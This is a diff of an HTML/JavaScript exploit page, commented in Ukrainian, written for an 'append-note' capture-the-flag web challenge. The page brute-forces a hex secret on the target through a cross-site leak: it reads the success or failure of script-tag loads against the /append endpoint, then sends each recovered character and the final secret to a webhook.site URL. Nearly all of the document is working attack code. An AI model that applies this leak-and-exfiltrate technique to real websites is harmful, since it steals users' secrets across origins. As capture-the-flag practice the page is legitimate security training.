@@ -1,59 +1,63 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h1 id="status">Ready</h1>
     <script>
-        const TARGET = "https://append-note-9na9l.instancer.lac.tf";
-        const WEBHOOK = "https://webhook.site/813e752f-c17f-4c9f-9dde-ec9605ff6a59";
+        const TARGET = "https://append-note-voboi.instancer.lac.tf";
+        const WEBHOOK = "https://webhook.site/706d65f1-4c2c-4c61-b226-7d388e69f359";
         const ALPHABET = "0123456789abcdef";
         let secret = "";
 
-        async function check(testStr) {
+        // Функція для логування на вебхук
+        const report = (msg) => fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`, {mode: 'no-cors'});
+
+        function probe(testStr) {
             return new Promise((resolve) => {
-                const img = new Image();
-                // Якщо рядок є префіксом НОТАТКИ, сервер поверне 200 OK.
-                // Оскільки ми хочемо знайти секрет, а не власні попередні спроби,
-                // нам треба діяти ШВИДКО після рестарту інстансу.
-                img.src = `${TARGET}/append?content=${testStr}&url=${TARGET}/favicon.ico`;
+                const s = document.createElement('script');
+                // Додаємо випадковий URL параметр, щоб обійти валідацію host в app.py
+                s.src = `${TARGET}/append?content=${testStr}&url=${TARGET}/`;
                 
-                img.onload = () => resolve(true);
-                img.onerror = () => resolve(false);
+                // Якщо 200 OK, спрацює onload (навіть якщо вміст не JS)
+                s.onload = () => {
+                    cleanup();
+                    resolve(true);
+                };
                 
-                // Через 400мс вважаємо, що не вгадали
-                setTimeout(() => resolve(false), 400);
+                // Якщо 404 Not Found, спрацює onerror
+                s.onerror = () => {
+                    cleanup();
+                    resolve(false);
+                };
+
+                const cleanup = () => {
+                    if (s.parentNode) document.body.removeChild(s);
+                };
+
+                document.body.appendChild(s);
+                // Короткий таймаут, щоб не чекати вічно
+                setTimeout(() => { cleanup(); resolve(false); }, 800);
             });
         }
 
-        async function run() {
-            // ПОВІДОМЛЕННЯ: Перед запуском бота ОБОВ'ЯЗКОВО рестартоніть інстанс завдання!
-            // Це очистить масив notes від попередніх спроб.
-            
+        async function solve() {
+            report("Starting_Exploit");
             for (let i = 0; i < 8; i++) {
                 for (let char of ALPHABET) {
                     let attempt = secret + char;
-					fetch(`${WEBHOOK}?try=${attempt}`);
-                    // Ми використовуємо fetch з mode: no-cors, щоб просто отримати статус
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 1000);
-
-                    try {
-                        const res = await fetch(`${TARGET}/append?content=${attempt}&url=${TARGET}/`, {
-                            mode: 'no-cors'
-                        });
-                        // У цьому завданні статус 200/404 для no-cors fetch 
-                        // важко розрізнити, тому Image() або Object краще.
-                        
-                        if (await check(attempt)) {
-                            secret += char;
-                            fetch(`${WEBHOOK}?found=${secret}`);
-                            break;
-                        }
-                    } catch (e) {}
+                    document.getElementById('status').innerText = "Testing: " + attempt;
+                    
+                    if (await probe(attempt)) {
+                        secret += char;
+                        report("Found_Char:_" + char + "_Current:_" + secret);
+                        break; 
+                    }
                 }
             }
-            fetch(`${WEBHOOK}?final=${secret}`);
+            report("SUCCESS_FINAL_SECRET:_" + secret);
         }
 
-        window.onload = run;
+        // Запускаємо автоматично через 1 сек після завантаження
+        setTimeout(solve, 1000);
     </script>
 </body>
 </html>
